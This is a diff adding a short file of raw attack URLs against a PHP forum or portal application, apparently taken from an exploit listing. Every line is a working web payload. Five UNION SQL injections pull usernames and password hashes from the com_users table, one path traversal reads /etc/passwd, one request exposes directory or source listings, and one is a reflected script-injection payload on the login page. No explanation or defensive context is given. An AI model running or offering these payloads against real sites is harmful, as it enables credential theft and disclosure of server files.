@@ -1,0 +1,16 @@
+http://www.example.com/path/index.php?n=guest&amp;c=0&amp;m=forum&amp;s=1&amp;forum_id=-1&#039; UNION ALL SELECT 1,2,CONCAT(nick, 0x3a, pwd),4,5,6,7,8 FROM com_users%23
+
+http://www.example.com/path/index.php?n=guest&amp;c=0&amp;m=forum&amp;s=2&amp;forum_id=0&amp;topic_id=-1&#039; UNION ALL SELECT GROUP_CONCAT(CONCAT(nick, 0x3a, pwd)) FROM com_users%23
+
+http://www.example.com/path/index.php?n=guest&amp;c=0&amp;m=search&amp;s=id&amp;wert=-1%25&quot; UNION ALL SELECT CONCAT(nick, 0x3a, pwd),2 FROM com_users%23
+
+http://www.example.com/path/index.php?n=guest&amp;c=0&amp;m=search&amp;s=nick&amp;wert=-1%25&quot; UNION ALL SELECT CONCAT(nick, 0x3a, pwd),2 FROM com_users%23
+
+http://www.example.com/path/index.php?n=guest&amp;c=0&amp;m=search&amp;s=forum&amp;wert=-1%25&quot; UNION ALL SELECT 1,2,3,4,CONCAT(nick, 0x3a, pwd),6 FROM com_users%23
+
+http://www.example.com/path/module/admin/files/show_file.php?file=../../../../../../../../etc/passwd
+
+http://www.example.com/path/module/admin/files/show_source.php?path=/etc
+
+http://www.example.com/path/templates/1/login.php?msg=&lt;script&gt;alert(&#039;XSS&#039;);&lt;/script&gt;
+
